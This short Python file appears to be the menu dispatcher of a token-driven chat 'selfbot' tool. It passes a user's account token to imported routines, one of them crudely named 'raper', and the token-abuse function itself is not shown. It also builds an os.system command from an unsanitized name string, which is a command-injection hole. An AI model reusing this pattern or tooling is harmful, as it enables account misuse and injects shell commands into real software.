from leet.self import WebsocketConn
from tokf.rape import raper
import os

def execs(keyvalue, token, userid):
	webs = WebsocketConn(token, userid)
	os.system(f"@title Aether -Everest ./{keyvalue['name']}")
	if keyvalue["name"] == "1337":
		webs.leet_conn()

	elif keyvalue["name"] == "\n0\n//\n\\3-- Token\n/\\":
		raper(token)

	elif keyvalue["name"] == "Auto Response":
		webs.auto_response()